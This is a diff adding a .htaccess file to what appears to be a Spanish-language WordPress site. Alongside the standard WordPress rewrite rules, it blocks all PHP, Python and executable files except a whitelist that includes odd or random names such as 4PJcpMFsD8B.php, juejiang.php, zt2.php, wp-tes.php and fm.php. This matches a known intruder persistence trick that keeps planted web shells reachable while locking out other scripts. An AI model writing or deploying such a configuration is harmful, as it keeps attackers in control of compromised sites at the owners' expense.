@@ -1,0 +1,31 @@
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
+</IfModule>
+<FilesMatch ".*\.(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|phP|PhP|php5|suspected)$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch "^(index.php|4PJcpMFsD8B.php|5PJcpMFsD8B.php|7PJcpMFsD8B.php|11PJcpMFsD8B.php|3PJcpMFsD8B.php|deal.php|wp-login.php|juejiang.php|zt2.php|wp-cron.php|wp-signup.php|wp-tes.php|fm.php|contact.php)$">
+Order Allow,Deny
+Allow from all
+</FilesMatch>
+# BEGIN WordPress
+# Las directivas (líneas) entre «BEGIN WordPress» y «END WordPress» son
+# generadas dinámicamente y solo deberían ser modificadas mediante filtros de WordPress.
+# Cualquier cambio en las directivas que hay entre esos marcadores serán sobrescritas.
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
+RewriteBase /
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+</IfModule>
+
+# END WordPress
